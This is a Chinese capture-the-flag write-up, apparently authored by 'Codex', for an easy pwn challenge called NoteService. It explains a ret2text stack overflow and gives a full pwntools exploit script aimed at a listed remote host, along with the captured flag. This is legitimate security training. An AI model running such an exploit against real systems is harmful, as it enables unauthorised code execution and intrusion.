---
title: "PWN-NoteService"
ctf: "Unknown / standalone challenge"
date: 2026-05-30
category: pwn
difficulty: easy
points: 400
flag_format: "flag{...}"
author: "Codex"
---

# PWN-NoteService

## Summary

这是一个典型的 `ret2text` 栈溢出题。程序在 `vuln()` 中用 `read(0, buf, 0x100)` 向 64 字节栈缓冲区读入 256 字节数据，在 `No PIE`、`No Canary`、`NX enabled` 的条件下，直接覆盖返回地址跳到后门函数 `secret_note()`，由它执行 `system("/bin/sh")`。

## Solution

### Step 1: 找到溢出点和后门函数

关键函数反编译如下：

```c
int vuln()
{
  char buf[64];
  puts("=== Note Service ===");
  puts("Leave your note:");
  read(0, buf, 0x100u);
  return puts("Note saved. Thank you!");
}

int secret_note()
{
  return system("/bin/sh");
}
```

保护信息：

```text
Arch: amd64
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE
```

因此偏移就是：

```text
0x40(buf) + 0x8(saved rbp) = 72
```

### Step 2: ret2text 并处理栈对齐

如果直接返回到 `secret_note()`，`system()` 会因为栈未按 16 字节对齐而不稳定。这个二进制里存在单独的 `ret` gadget：

```text
0x40101a : ret
```

所以最终 payload 为：

```python
payload = b"A" * 72 + p64(0x40101A) + p64(0x401196) + p64(0x4011F6)
```

其中：

- `0x40101A` 是对齐用的 `ret`
- `0x401196` 是 `secret_note`
- `0x4011F6` 是 `main`，用于在 shell 退出后给程序一个合法返回点

完整利用脚本：

```python
from pwn import *

context.binary = ELF("./vuln", checksec=False)
context.arch = "amd64"

HOST = "120.27.146.76"
PORT = 25835

RET = 0x40101A
OFFSET = 72


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(context.binary.path)


def build_payload():
    elf = context.binary
    return flat(
        b"A" * OFFSET,
        RET,
        elf.sym.secret_note,
        elf.sym.main,
    )


def exploit():
    io = start()
    io.recvuntil(b"Leave your note:\n")
    io.send(build_payload())
    io.recvuntil(b"Note saved. Thank you!\n")
    return io


if __name__ == "__main__":
    io = exploit()
    if args.REMOTE:
        io.sendline(b"cat /flag")
        print(io.recvrepeat(2).decode("latin-1", "ignore"))
    else:
        io.interactive()
```

远程执行：

```bash
python3 exploit.py REMOTE=1
```

实际拿到的 flag：

```text
flag{551f3085499905d2bb0f2bf9c15953a6}
```

## Flag

```text
flag{551f3085499905d2bb0f2bf9c15953a6}
```
